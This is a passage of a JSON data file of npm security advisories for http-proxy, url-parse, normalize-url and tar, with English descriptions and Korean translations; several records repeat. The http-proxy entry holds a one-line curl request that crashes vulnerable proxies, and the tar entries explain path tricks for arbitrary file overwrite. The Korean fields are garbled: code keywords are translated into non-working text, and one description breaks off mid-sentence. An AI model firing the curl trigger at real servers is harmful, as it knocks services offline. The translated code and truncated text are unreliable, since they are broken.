    "description": "Versions of `http-proxy` prior to 1.18.1 are vulnerable to Denial of Service. An HTTP request with a long body triggers an `ERR_HTTP_HEADERS_SENT` unhandled exception that crashes the proxy server. This is only possible when the proxy server sets headers in the proxy request using the `proxyReq.setHeader` function.   \n\nFor a proxy server running on `http://localhost:3000`, the following curl request triggers the unhandled exception:  \n```curl -XPOST http://localhost:3000 -d \"$(python -c 'print(\"x\"*1025)')\"```\n\n\n## Recommendation\n\nUpgrade to version 1.18.1 or later",
    "identifiers": "GHSA : GHSA-6x33-pw7p-hmpq",
    "severity": "HIGH",
    "updatedAt": "2023-03-13T22:18:16Z",
    "publishedAt": "2020-09-04T17:59:49Z",
    "references": "https://github.com/http-party/node-http-proxy/pull/1447/files\nhttps://www.npmjs.com/advisories/1486\nhttps://github.com/http-party/node-http-proxy/pull/1447/commits/4718119ffbe895aecd9be0d6430357d44b4c7fd3\nhttps://github.com/advisories/GHSA-6x33-pw7p-hmpq",
    "name": "http-proxy",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.18.1",
    "identifier": "1.18.1",
    "descriptionKR": "1.18.1 이전의 `http-proxy` 버전은 서비스 거부에 취약합니다. 본문이 긴 HTTP 요청은 프록시 서버를 충돌시키는 `ERR_HTTP_HEADERS_SENT` 처리되지 않은 예외를 트리거합니다. 이는 프록시 서버가 `proxyReq.setHeader` 기능을 사용하여 프록시 요청에 헤더를 설정하는 경우에만 가능합니다.\n\n`http://localhost:3000`에서 실행 중인 프록시 서버의 경우 다음 curl 요청은 처리되지 않은 예외를 트리거합니다.\n```컬 -XPOST http://localhost:3000 -d \"$(python -c 'print(\"x\"*1025)')\"```\n\n\n## 추천\n\n버전 1.18.1 이상으로 업그레이드"
  },
  {
    "description": "url-parse prior to version 1.5.8 is vulnerable to Authorization Bypass Through User-Controlled Key.",
    "identifiers": "GHSA : GHSA-hgjh-723h-mx2j\nCVE : CVE-2022-0686",
    "severity": "CRITICAL",
    "updatedAt": "2023-03-13T22:00:19Z",
    "publishedAt": "2022-02-21T00:00:21Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-0686\nhttps://github.com/unshiftio/url-parse/commit/d5c64791ef496ca5459ae7f2176a31ea53b127e5\nhttps://huntr.dev/bounties/55fd06cd-9054-4d80-83be-eb5a454be78c\nhttps://security.netapp.com/advisory/ntap-20220325-0006/\nhttps://lists.debian.org/debian-lts-announce/2023/02/msg00030.html\nhttps://github.com/advisories/GHSA-hgjh-723h-mx2j",
    "name": "url-parse",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.5.8",
    "identifier": "1.5.8",
    "descriptionKR": "1.5.8 이전 버전의 url-parse는 사용자 제어 키를 통한 인증 우회에 취약합니다."
  },
  {
    "description": "The normalize-url package before 4.5.1, 5.x before 5.3.1, and 6.x before 6.0.1 for Node.js has a ReDoS (regular expression denial of service) issue because it has exponential performance for data: URLs.",
    "identifiers": "GHSA : GHSA-px4h-xg32-q955\nCVE : CVE-2021-33502",
    "severity": "HIGH",
    "updatedAt": "2023-03-13T21:54:45Z",
    "publishedAt": "2021-06-08T23:11:43Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-33502\nhttps://github.com/sindresorhus/normalize-url/releases/tag/v6.0.1\nhttps://github.com/sindresorhus/normalize-url/commit/b1fdb5120b6d27a88400d8800e67ff5a22bd2103\nhttps://security.netapp.com/advisory/ntap-20210706-0001/\nhttps://github.com/advisories/GHSA-px4h-xg32-q955",
    "name": "normalize-url",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.3.0, < 4.5.1",
    "identifier": "4.5.1",
    "descriptionKR": "Node.js용 4.5.1 이전의 normalize-url 패키지, 5.3.1 이전의 5.x, 6.0.1 이전의 6.x에는 다음과 같은 데이터에 대한 기하급수적인 성능이 있기 때문에 ReDoS(정규식 서비스 거부) 문제가 있습니다. ."
  },
  {
    "description": "The normalize-url package before 4.5.1, 5.x before 5.3.1, and 6.x before 6.0.1 for Node.js has a ReDoS (regular expression denial of service) issue because it has exponential performance for data: URLs.",
    "identifiers": "GHSA : GHSA-px4h-xg32-q955\nCVE : CVE-2021-33502",
    "severity": "HIGH",
    "updatedAt": "2023-03-13T21:54:45Z",
    "publishedAt": "2021-06-08T23:11:43Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-33502\nhttps://github.com/sindresorhus/normalize-url/releases/tag/v6.0.1\nhttps://github.com/sindresorhus/normalize-url/commit/b1fdb5120b6d27a88400d8800e67ff5a22bd2103\nhttps://security.netapp.com/advisory/ntap-20210706-0001/\nhttps://github.com/advisories/GHSA-px4h-xg32-q955",
    "name": "normalize-url",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 6.0.0, < 6.0.1",
    "identifier": "6.0.1",
    "descriptionKR": "Node.js용 4.5.1 이전의 normalize-url 패키지, 5.3.1 이전의 5.x, 6.0.1 이전의 6.x에는 다음과 같은 데이터에 대한 기하급수적인 성능이 있기 때문에 ReDoS(정규식 서비스 거부) 문제가 있습니다. ."
  },
  {
    "description": "The normalize-url package before 4.5.1, 5.x before 5.3.1, and 6.x before 6.0.1 for Node.js has a ReDoS (regular expression denial of service) issue because it has exponential performance for data: URLs.",
    "identifiers": "GHSA : GHSA-px4h-xg32-q955\nCVE : CVE-2021-33502",
    "severity": "HIGH",
    "updatedAt": "2023-03-13T21:54:45Z",
    "publishedAt": "2021-06-08T23:11:43Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-33502\nhttps://github.com/sindresorhus/normalize-url/releases/tag/v6.0.1\nhttps://github.com/sindresorhus/normalize-url/commit/b1fdb5120b6d27a88400d8800e67ff5a22bd2103\nhttps://security.netapp.com/advisory/ntap-20210706-0001/\nhttps://github.com/advisories/GHSA-px4h-xg32-q955",
    "name": "normalize-url",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 5.0.0, < 5.3.1",
    "identifier": "5.3.1",
    "descriptionKR": "Node.js용 4.5.1 이전의 normalize-url 패키지, 5.3.1 이전의 5.x, 6.0.1 이전의 6.x에는 다음과 같은 데이터에 대한 기하급수적인 성능이 있기 때문에 ReDoS(정규식 서비스 거부) 문제가 있습니다. ."
  },
  {
    "description": "### Impact\n\nArbitrary File Creation, Arbitrary File Overwrite, Arbitrary Code Execution\n\n`node-tar` aims to guarantee that any file whose location would be modified by a symbolic link is not extracted. This is, in part, achieved by ensuring that extracted directories are not symlinks. Additionally, in order to prevent unnecessary stat calls to determine whether a given path is a directory, paths are cached when directories are created.\n\nThis logic was insufficient when extracting tar files that contained both a directory and a symlink with the same name as the directory, where the symlink and directory names in the archive entry used backslashes as a path separator on posix systems. The cache checking logic used both `\\` and `/` characters as path separators, however `\\` is a valid filename character on posix systems.\n\nBy first creating a directory, and then replacing that directory with a symlink, it was thus possible to bypass node-tar symlink checks on directories, essentially allowing an untrusted tar file to symlink into an arbitrary location and subsequently extracting arbitrary files into that location, thus allowing arbitrary file creation and overwrite.\n\nAdditionally, a similar confusion could arise on case-insensitive filesystems.  If a tar archive contained a directory at `FOO`, followed by a symbolic link named `foo`, then on case-insensitive file systems, the creation of the symbolic link would remove the directory from the filesystem, but _not_ from the internal directory cache, as it would not be treated as a cache hit.  A subsequent file entry within the `FOO` directory would then be placed in the target of the symbolic link, thinking that the directory had already been created. \n\nThese issues were addressed in releases 4.4.16, 5.0.8 and 6.1.7.\n\nThe v3 branch of `node-tar` has been deprecated and did not receive patches for these issues. If you are still using a v3 release we recommend you update to a more recent version of `node-tar`. If this is not possible, a workaround is available below.\n\n### Patches\n\n4.4.16 || 5.0.8 || 6.1.7\n\n### Workarounds\n\nUsers may work around this vulnerability without upgrading by creating a custom filter method which prevents the extraction of symbolic links.\n\n```js\nconst tar = require('tar')\n\ntar.x({\n  file: 'archive.tgz',\n  filter: (file, entry) => {\n    if (entry.type === 'SymbolicLink') {\n      return false\n    } else {\n      return true\n    }\n  }\n})\n```\n\nUsers are encouraged to upgrade to the latest patched versions, rather than attempt to sanitize tar input themselves.\n\n### Fix\n\nThe problem is addressed in the following ways:\n\n1. All paths are normalized to use `/` as a path separator, replacing `\\` with `/` on Windows systems, and leaving `\\` intact in the path on posix systems.  This is performed in depth, at every level of the program where paths are consumed.\n2. Directory cache pruning is performed case-insensitively.  This _may_ result in undue cache misses on case-sensitive file systems, but the performance impact is negligible.\n\n#### Caveat\n\nNote that this means that the `entry` objects exposed in various parts of tar's API will now always use `/` as a path separator, even on Windows systems.  This is not expected to cause problems, as `/` is a valid path separator on Windows systems, but _may_ result in issues if `entry.path` is compared against a path string coming from some other API such as `fs.realpath()` or `path.resolve()`.\n\nUsers are encouraged to always normalize paths using a well-tested method such as `path.resolve()` before comparing paths to one another.",
    "identifiers": "GHSA : GHSA-9r2w-394v-53qc\nCVE : CVE-2021-37701",
    "severity": "HIGH",
    "updatedAt": "2023-03-13T21:51:00Z",
    "publishedAt": "2021-08-31T16:05:27Z",
    "references": "https://github.com/npm/node-tar/security/advisories/GHSA-9r2w-394v-53qc\nhttps://www.npmjs.com/package/tar\nhttps://nvd.nist.gov/vuln/detail/CVE-2021-37701\nhttps://www.oracle.com/security-alerts/cpuoct2021.html\nhttps://www.debian.org/security/2021/dsa-5008\nhttps://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf\nhttps://lists.debian.org/debian-lts-announce/2022/12/msg00023.html\nhttps://github.com/advisories/GHSA-9r2w-394v-53qc",
    "name": "tar",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 6.0.0, < 6.1.7",
    "identifier": "6.1.7",
    "descriptionKR": "### 영향\n\n임의 파일 생성, 임의 파일 덮어쓰기, 임의 코드 실행\n\n`node-tar`는 심볼릭 링크에 의해 위치가 수정되는 파일이 추출되지 않도록 보장하는 것을 목표로 합니다. 이것은 부분적으로 추출된 디렉토리가 심볼릭 링크가 아닌지 확인함으로써 달성됩니다. 또한 주어진 경로가 디렉토리인지 여부를 확인하기 위한 불필요한 stat 호출을 방지하기 위해 디렉토리가 생성될 때 경로가 캐시됩니다.\n\n이 논리는 디렉토리와 디렉토리와 동일한 이름을 가진 심볼릭 링크가 모두 포함된 tar 파일을 추출할 때 충분하지 않았습니다. 여기서 아카이브 항목의 심볼릭 링크와 디렉토리 이름은 posix 시스템에서 경로 구분 기호로 백슬래시를 사용했습니다. 캐시 검사 논리는 `\\` 및 `/` 문자를 모두 경로 구분 기호로 사용했지만 `\\`는 posix 시스템에서 유효한 파일 이름 문자입니다.\n\n먼저 디렉토리를 생성한 다음 해당 디렉토리를 심볼릭 링크로 대체함으로써 디렉토리에 대한 node-tar 심볼릭 링크 검사를 우회할 수 있었으며 기본적으로 신뢰할 수 없는 tar 파일이 임의의 위치로 심볼릭 링크되고 이후에 해당 위치로 임의의 파일을 추출할 수 있었습니다. 따라서 임의의 파일 생성 및 덮어쓰기가 허용됩니다.\n\n또한 대소문자를 구분하지 않는 파일 시스템에서도 비슷한 혼란이 발생할 수 있습니다. tar 아카이브가 `FOO`에 디렉토리를 포함하고 그 뒤에 `foo`라는 심볼릭 링크가 있는 경우 대소문자를 구분하지 않는 파일 시스템에서 심볼릭 링크를 생성하면 파일 시스템에서 디렉토리가 제거되지만 내부 디렉토리에서는 제거되지 _않습니다_ 캐시 적중으로 처리되지 않기 때문입니다. 'FOO' 디렉토리 내의 후속 파일 항목은 디렉토리가 이미 생성되었다고 생각하여 심볼릭 링크의 대상에 배치됩니다.\n\n이러한 문제는 릴리스 4.4.16, 5.0.8 및 6.1.7에서 해결되었습니다.\n\n`node-tar`의 v3 브랜치는 더 이상 사용되지 않으며 이러한 문제에 대한 패치를 받지 못했습니다. 아직 v3 릴리스를 사용 중인 경우 최신 버전의 `node-tar`로 업데이트하는 것이 좋습니다. 이것이 가능하지 않은 경우 아래에서 해결 방법을 사용할 수 있습니다.\n\n### 패치\n\n4.4.16 || 5.0.8 || 6.1.7\n\n### 해결 방법\n\n사용자는 심볼릭 링크 추출을 방지하는 사용자 정의 필터 방법을 생성하여 업그레이드하지 않고도 이 취약점을 해결할 수 있습니다.\n\n```js\nconst tar = 요구('타르')\n\ntar.x({\n  파일: 'archive.tgz',\n  필터: (파일, 항목) => {\n    if (entry.type === 'SymbolicLink') {\n      거짓 반환\n    } 또 다른 {\n      참을 반환\n    }\n  }\n})\n```\n\n사용자는 tar 입력 자체를 삭제하려고 시도하기보다는 최신 패치 버전으로 업그레이드하는 것이 좋습니다.\n\n### 고치다\n\n이 문제는 다음과 같은 방법으로 해결됩니다.\n\n1. 모든 경로는 `/`를 경로 구분 기호로 사용하여 Windows 시스템에서 `\\`를 `/`로 바꾸고 posix 시스템에서는 경로에 `\\`를 그대로 두도록 정규화됩니다. 이는 경로가 사용되는 프로그램의 모든 수준에서 심층적으로 수행됩니다.\n2. 디렉터리 캐시 정리는 대소문자를 구분하지 않고 수행됩니다. 이 _may_ 결과 대/소문자를 구분하는 파일 시스템에서 과도한 캐시 미스가 발생하지만 성능에 미치는 영향은 미미합니다.\n\n#### 주의 사항\n\n이는 tar API의 다양한 부분에 노출된 `entry` 객체가 이제 Windows 시스템에서도 경로 구분 기호로 항상 `/`를 사용함을 의미합니다. `/`는 Windows 시스템에서 유효한 경로 구분 기호이므로 문제가 발생하지 않을 것으로 예상되지만 `fs.realpath( )` 또는 `path.resolve()`.\n\n사용자는 경로를 서로 비교하기 전에 항상 `path.resolve()`와 같은 잘 테스트된 방법을 사용하여 경로를 정규화하는 것이 좋습니다."
  },
  {
    "description": "### Impact\n\nArbitrary File Creation, Arbitrary File Overwrite, Arbitrary Code Execution\n\n`node-tar` aims to guarantee that any file whose location would be modified by a symbolic link is not extracted. This is, in part, achieved by ensuring that extracted directories are not symlinks. Additionally, in order to prevent unnecessary stat calls to determine whether a given path is a directory, paths are cached when directories are created.\n\nThis logic was insufficient when extracting tar files that contained both a directory and a symlink with the same name as the directory, where the symlink and directory names in the archive entry used backslashes as a path separator on posix systems. The cache checking logic used both `\\` and `/` characters as path separators, however `\\` is a valid filename character on posix systems.\n\nBy first creating a directory, and then replacing that directory with a symlink, it was thus possible to bypass node-tar symlink checks on directories, essentially allowing an untrusted tar file to symlink into an arbitrary location and subsequently extracting arbitrary files into that location, thus allowing arbitrary file creation and overwrite.\n\nAdditionally, a similar confusion could arise on case-insensitive filesystems.  If a tar archive contained a directory at `FOO`, followed by a symbolic link named `foo`, then on case-insensitive file systems, the creation of the symbolic link would remove the directory from the filesystem, but _not_ from the internal directory cache, as it would not be treated as a cache hit.  A subsequent file entry within the `FOO` directory would then be placed in the target of the symbolic link, thinking that the directory had already been created. \n\nThese issues were addressed in releases 4.4.16, 5.0.8 and 6.1.7.\n\nThe v3 branch of `node-tar` has been deprecated and did not receive patches for these issues. If you are still using a v3 release we recommend you update to a more recent version of `node-tar`. If this is not possible, a workaround is available below.\n\n### Patches\n\n4.4.16 || 5.0.8 || 6.1.7\n\n### Workarounds\n\nUsers may work around this vulnerability without upgrading by creating a custom filter method which prevents the extraction of symbolic links.\n\n```js\nconst tar = require('tar')\n\ntar.x({\n  file: 'archive.tgz',\n  filter: (file, entry) => {\n    if (entry.type === 'SymbolicLink') {\n      return false\n    } else {\n      return true\n    }\n  }\n})\n```\n\nUsers are encouraged to upgrade to the latest patched versions, rather than attempt to sanitize tar input themselves.\n\n### Fix\n\nThe problem is addressed in the following ways:\n\n1. All paths are normalized to use `/` as a path separator, replacing `\\` with `/` on Windows systems, and leaving `\\` intact in the path on posix systems.  This is performed in depth, at every level of the program where paths are consumed.\n2. Directory cache pruning is performed case-insensitively.  This _may_ result in undue cache misses on case-sensitive file systems, but the performance impact is negligible.\n\n#### Caveat\n\nNote that this means that the `entry` objects exposed in various parts of tar's API will now always use `/` as a path separator, even on Windows systems.  This is not expected to cause problems, as `/` is a valid path separator on Windows systems, but _may_ result in issues if `entry.path` is compared against a path string coming from some other API such as `fs.realpath()` or `path.resolve()`.\n\nUsers are encouraged to always normalize paths using a well-tested method such as `path.resolve()` before comparing paths to one another.",
    "identifiers": "GHSA : GHSA-9r2w-394v-53qc\nCVE : CVE-2021-37701",
    "severity": "HIGH",
    "updatedAt": "2023-03-13T21:51:00Z",
    "publishedAt": "2021-08-31T16:05:27Z",
    "references": "https://github.com/npm/node-tar/security/advisories/GHSA-9r2w-394v-53qc\nhttps://www.npmjs.com/package/tar\nhttps://nvd.nist.gov/vuln/detail/CVE-2021-37701\nhttps://www.oracle.com/security-alerts/cpuoct2021.html\nhttps://www.debian.org/security/2021/dsa-5008\nhttps://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf\nhttps://lists.debian.org/debian-lts-announce/2022/12/msg00023.html\nhttps://github.com/advisories/GHSA-9r2w-394v-53qc",
    "name": "tar",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 5.0.0, < 5.0.8",
    "identifier": "5.0.8",
    "descriptionKR": "### 영향\n\n임의 파일 생성, 임의 파일 덮어쓰기, 임의 코드 실행\n\n`node-tar`는 심볼릭 링크에 의해 위치가 수정되는 파일이 추출되지 않도록 보장하는 것을 목표로 합니다. 이것은 부분적으로 추출된 디렉토리가 심볼릭 링크가 아닌지 확인함으로써 달성됩니다. 또한 주어진 경로가 디렉토리인지 여부를 확인하기 위한 불필요한 stat 호출을 방지하기 위해 디렉토리가 생성될 때 경로가 캐시됩니다.\n\n이 논리는 디렉토리와 디렉토리와 동일한 이름을 가진 심볼릭 링크가 모두 포함된 tar 파일을 추출할 때 충분하지 않았습니다. 여기서 아카이브 항목의 심볼릭 링크와 디렉토리 이름은 posix 시스템에서 경로 구분 기호로 백슬래시를 사용했습니다. 캐시 검사 논리는 `\\` 및 `/` 문자를 모두 경로 구분 기호로 사용했지만 `\\`는 posix 시스템에서 유효한 파일 이름 문자입니다.\n\n먼저 디렉토리를 생성한 다음 해당 디렉토리를 심볼릭 링크로 대체함으로써 디렉토리에 대한 node-tar 심볼릭 링크 검사를 우회할 수 있었으며 기본적으로 신뢰할 수 없는 tar 파일이 임의의 위치로 심볼릭 링크되고 이후에 해당 위치로 임의의 파일을 추출할 수 있었습니다. 따라서 임의의 파일 생성 및 덮어쓰기가 허용됩니다.\n\n또한 대소문자를 구분하지 않는 파일 시스템에서도 비슷한 혼란이 발생할 수 있습니다. tar 아카이브가 `FOO`에 디렉토리를 포함하고 그 뒤에 `foo`라는 심볼릭 링크가 있는 경우 대소문자를 구분하지 않는 파일 시스템에서 심볼릭 링크를 생성하면 파일 시스템에서 디렉토리가 제거되지만 내부 디렉토리에서는 제거되지 _않습니다_ 캐시 적중으로 처리되지 않기 때문입니다. 'FOO' 디렉토리 내의 후속 파일 항목은 디렉토리가 이미 생성되었다고 생각하여 심볼릭 링크의 대상에 배치됩니다.\n\n이러한 문제는 릴리스 4.4.16, 5.0.8 및 6.1.7에서 해결되었습니다.\n\n`node-tar`의 v3 브랜치는 더 이상 사용되지 않으며 이러한 문제에 대한 패치를 받지 못했습니다. 아직 v3 릴리스를 사용 중인 경우 최신 버전의 `node-tar`로 업데이트하는 것이 좋습니다. 이것이 가능하지 않은 경우 아래에서 해결 방법을 사용할 수 있습니다.\n\n### 패치\n\n4.4.16 || 5.0.8 || 6.1.7\n\n### 해결 방법\n\n사용자는 심볼릭 링크 추출을 방지하는 사용자 정의 필터 방법을 생성하여 업그레이드하지 않고도 이 취약점을 해결할 수 있습니다.\n\n```js\nconst tar = 요구('타르')\n\ntar.x({\n  파일: 'archive.tgz',\n  필터: (파일, 항목) => {\n    if (entry.type === 'SymbolicLink') {\n      거짓 반환\n    } 또 다른 {\n      참을 반환\n    }\n  }\n})\n```\n\n사용자는 tar 입력 자체를 삭제하려고 시도하기보다는 최신 패치 버전으로 업그레이드하는 것이 좋습니다.\n\n### 고치다\n\n이 문제는 다음과 같은 방법으로 해결됩니다.\n\n1. 모든 경로는 `/`를 경로 구분 기호로 사용하여 Windows 시스템에서 `\\`를 `/`로 바꾸고 posix 시스템에서는 경로에 `\\`를 그대로 두도록 정규화됩니다. 이는 경로가 사용되는 프로그램의 모든 수준에서 심층적으로 수행됩니다.\n2. 디렉터리 캐시 정리는 대소문자를 구분하지 않고 수행됩니다. 이 _may_ 결과 대/소문자를 구분하는 파일 시스템에서 과도한 캐시 미스가 발생하지만 성능에 미치는 영향은 미미합니다.\n\n#### 주의 사항\n\n이는 tar API의 다양한 부분에 노출된 `entry` 객체가 이제 Windows 시스템에서도 경로 구분 기호로 항상 `/`를 사용함을 의미합니다. `/`는 Windows 시스템에서 유효한 경로 구분 기호이므로 문제가 발생하지 않을 것으로 예상되지만 `fs.realpath( )` 또는 `path.resolve()`.\n\n사용자는 경로를 서로 비교하기 전에 항상 `path.resolve()`와 같은 잘 테스트된 방법을 사용하여 경로를 정규화하는 것이 좋습니다."
  },
  {
    "description": "### Impact\n\nArbitrary File Creation, Arbitrary File Overwrite, Arbitrary Code Execution\n\n`node-tar` aims to guarantee that any file whose location would be modified by a symbolic link is not extracted. This is, in part, achieved by ensuring that extracted directories are not symlinks. Additionally, in order to prevent unnecessary stat calls to determine whether a given path is a directory, paths are cached when directories are created.\n\nThis logic was insufficient when extracting tar files that contained both a directory and a symlink with the same name as the directory, where the symlink and directory names in the archive entry used backslashes as a path separator on posix systems. The cache checking logic used both `\\` and `/` characters as path separators, however `\\` is a valid filename character on posix systems.\n\nBy first creating a directory, and then replacing that directory with a symlink, it was thus possible to bypass node-tar symlink checks on directories, essentially allowing an untrusted tar file to symlink into an arbitrary location and subsequently extracting arbitrary files into that location, thus allowing arbitrary file creation and overwrite.\n\nAdditionally, a similar confusion could arise on case-insensitive filesystems.  If a tar archive contained a directory at `FOO`, followed by a symbolic link named `foo`, then on case-insensitive file systems, the creation of the symbolic link would remove the directory from the filesystem, but _not_ from the internal directory cache, as it would not be treated as a cache hit.  A subsequent file entry within the `FOO` directory would then be placed in the target of the symbolic link, thinking that the directory had already been created. \n\nThese issues were addressed in releases 4.4.16, 5.0.8 and 6.1.7.\n\nThe v3 branch of `node-tar` has been deprecated and did not receive patches for these issues. If you are still using a v3 release we recommend you update to a more recent version of `node-tar`. If this is not possible, a workaround is available below.\n\n### Patches\n\n4.4.16 || 5.0.8 || 6.1.7\n\n### Workarounds\n\nUsers may work around this vulnerability without upgrading by creating a custom filter method which prevents the extraction of symbolic links.\n\n```js\nconst tar = require('tar')\n\ntar.x({\n  file: 'archive.tgz',\n  filter: (file, entry) => {\n    if (entry.type === 'SymbolicLink') {\n      return false\n    } else {\n      return true\n    }\n  }\n})\n```\n\nUsers are encouraged to upgrade to the latest patched versions, rather than attempt to sanitize tar input themselves.\n\n### Fix\n\nThe problem is addressed in the following ways:\n\n1. All paths are normalized to use `/` as a path separator, replacing `\\` with `/` on Windows systems, and leaving `\\` intact in the path on posix systems.  This is performed in depth, at every level of the program where paths are consumed.\n2. Directory cache pruning is performed case-insensitively.  This _may_ result in undue cache misses on case-sensitive file systems, but the performance impact is negligible.\n\n#### Caveat\n\nNote that this means that the `entry` objects exposed in various parts of tar's API will now always use `/` as a path separator, even on Windows systems.  This is not expected to cause problems, as `/` is a valid path separator on Windows systems, but _may_ result in issues if `entry.path` is compared against a path string coming from some other API such as `fs.realpath()` or `path.resolve()`.\n\nUsers are encouraged to always normalize paths using a well-tested method such as `path.resolve()` before comparing paths to one another.",
    "identifiers": "GHSA : GHSA-9r2w-394v-53qc\nCVE : CVE-2021-37701",
    "severity": "HIGH",
    "updatedAt": "2023-03-13T21:51:00Z",
    "publishedAt": "2021-08-31T16:05:27Z",
    "references": "https://github.com/npm/node-tar/security/advisories/GHSA-9r2w-394v-53qc\nhttps://www.npmjs.com/package/tar\nhttps://nvd.nist.gov/vuln/detail/CVE-2021-37701\nhttps://www.oracle.com/security-alerts/cpuoct2021.html\nhttps://www.debian.org/security/2021/dsa-5008\nhttps://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf\nhttps://lists.debian.org/debian-lts-announce/2022/12/msg00023.html\nhttps://github.com/advisories/GHSA-9r2w-394v-53qc",
    "name": "tar",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.4.16",
    "identifier": "4.4.16",
    "descriptionKR": "### 영향\n\n임의 파일 생성, 임의 파일 덮어쓰기, 임의 코드 실행\n\n`node-tar`는 심볼릭 링크에 의해 위치가 수정되는 파일이 추출되지 않도록 보장하는 것을 목표로 합니다. 이것은 부분적으로 추출된 디렉토리가 심볼릭 링크가 아닌지 확인함으로써 달성됩니다. 또한 주어진 경로가 디렉토리인지 여부를 확인하기 위한 불필요한 stat 호출을 방지하기 위해 디렉토리가 생성될 때 경로가 캐시됩니다.\n\n이 논리는 디렉토리와 디렉토리와 동일한 이름을 가진 심볼릭 링크가 모두 포함된 tar 파일을 추출할 때 충분하지 않았습니다. 여기서 아카이브 항목의 심볼릭 링크와 디렉토리 이름은 posix 시스템에서 경로 구분 기호로 백슬래시를 사용했습니다. 캐시 검사 논리는 `\\` 및 `/` 문자를 모두 경로 구분 기호로 사용했지만 `\\`는 posix 시스템에서 유효한 파일 이름 문자입니다.\n\n먼저 디렉토리를 생성한 다음 해당 디렉토리를 심볼릭 링크로 대체함으로써 디렉토리에 대한 node-tar 심볼릭 링크 검사를 우회할 수 있었으며 기본적으로 신뢰할 수 없는 tar 파일이 임의의 위치로 심볼릭 링크되고 이후에 해당 위치로 임의의 파일을 추출할 수 있었습니다. 따라서 임의의 파일 생성 및 덮어쓰기가 허용됩니다.\n\n또한 대소문자를 구분하지 않는 파일 시스템에서도 비슷한 혼란이 발생할 수 있습니다. tar 아카이브가 `FOO`에 디렉토리를 포함하고 그 뒤에 `foo`라는 심볼릭 링크가 있는 경우 대소문자를 구분하지 않는 파일 시스템에서 심볼릭 링크를 생성하면 파일 시스템에서 디렉토리가 제거되지만 내부 디렉토리에서는 제거되지 _않습니다_ 캐시 적중으로 처리되지 않기 때문입니다. 'FOO' 디렉토리 내의 후속 파일 항목은 디렉토리가 이미 생성되었다고 생각하여 심볼릭 링크의 대상에 배치됩니다.\n\n이러한 문제는 릴리스 4.4.16, 5.0.8 및 6.1.7에서 해결되었습니다.\n\n`node-tar`의 v3 브랜치는 더 이상 사용되지 않으며 이러한 문제에 대한 패치를 받지 못했습니다. 아직 v3 릴리스를 사용 중인 경우 최신 버전의 `node-tar`로 업데이트하는 것이 좋습니다. 이것이 가능하지 않은 경우 아래에서 해결 방법을 사용할 수 있습니다.\n\n### 패치\n\n4.4.16 || 5.0.8 || 6.1.7\n\n### 해결 방법\n\n사용자는 심볼릭 링크 추출을 방지하는 사용자 정의 필터 방법을 생성하여 업그레이드하지 않고도 이 취약점을 해결할 수 있습니다.\n\n```js\nconst tar = 요구('타르')\n\ntar.x({\n  파일: 'archive.tgz',\n  필터: (파일, 항목) => {\n    if (entry.type === 'SymbolicLink') {\n      거짓 반환\n    } 또 다른 {\n      참을 반환\n    }\n  }\n})\n```\n\n사용자는 tar 입력 자체를 삭제하려고 시도하기보다는 최신 패치 버전으로 업그레이드하는 것이 좋습니다.\n\n### 고치다\n\n이 문제는 다음과 같은 방법으로 해결됩니다.\n\n1. 모든 경로는 `/`를 경로 구분 기호로 사용하여 Windows 시스템에서 `\\`를 `/`로 바꾸고 posix 시스템에서는 경로에 `\\`를 그대로 두도록 정규화됩니다. 이는 경로가 사용되는 프로그램의 모든 수준에서 심층적으로 수행됩니다.\n2. 디렉터리 캐시 정리는 대소문자를 구분하지 않고 수행됩니다. 이 _may_ 결과 대/소문자를 구분하는 파일 시스템에서 과도한 캐시 미스가 발생하지만 성능에 미치는 영향은 미미합니다.\n\n#### 주의 사항\n\n이는 tar API의 다양한 부분에 노출된 `entry` 객체가 이제 Windows 시스템에서도 경로 구분 기호로 항상 `/`를 사용함을 의미합니다. `/`는 Windows 시스템에서 유효한 경로 구분 기호이므로 문제가 발생하지 않을 것으로 예상되지만 `fs.realpath( )` 또는 `path.resolve()`.\n\n사용자는 경로를 서로 비교하기 전에 항상 `path.resolve()`와 같은 잘 테스트된 방법을 사용하여 경로를 정규화하는 것이 좋습니다."
  },
  {
    "description": "### Impact\n\nArbitrary File Creation, Arbitrary File Overwrite, Arbitrary Code Execution\n\nnode-tar aims to guarantee that any file whose location would be outside of the extraction target directory is not extracted. This is, in part, accomplished by sanitizing absolute paths of entries within the archive, skipping archive entries that contain `..` path portions, and resolving the sanitized paths against the extraction target directory.\n\nThis logic was insufficient on Windows systems when extracting tar files that contained a path that was not an absolute path, but specified a drive letter different from the extraction target, such as `C:some\\path`.  If the drive letter does not match the extraction target, for example `D:\\extraction\\dir`, then the result of `path.resolve(extractionDirectory, entryPath)` would resolve against the current working directory on the `C:` drive, rather than the extraction target directory.\n\nAdditionally, a `..` portion of the path could occur immediately after the drive letter, such as `C:../foo`, and was not properly sanitized by the logic that checked for `..` within the normalized and split portions of the path.\n\nThis only affects users of `node-tar` on Windows systems.\n\n### Patches\n\n4.4.18 || 5.0.10 || 6.1.9\n\n### Workarounds\n\nThere is no reasonable way to work around this issue without performing the same path normalization procedures that node-tar now does.\n\nUsers are encouraged to upgrade to the latest patched versions of node-tar, rather than attempt to sanitize paths themselves.\n\n### Fix\n\nThe fixed versions strip path roots from all paths prior to being resolved against the extraction target folder, even if such paths are not \"absolute\".\n\nAdditionally, a path starting with a drive letter and then two dots, like `c:../`, would bypass the check for `..` path portions.  This is checked properly in the patched versions.\n\nFinally, a defense in depth check is added, such that if the `entry.absolute` is outside of the extraction taret, and we are not in preservePaths:true mode, a warning is raised on that entry, and it is skipped.  Currently, it is believed that this check is redundant, but it did catch some oversights in development.\n",
    "identifiers": "GHSA : GHSA-5955-9wpr-37jh\nCVE : CVE-2021-37713",
    "severity": "HIGH",
    "updatedAt": "2023-03-13T21:47:38Z",
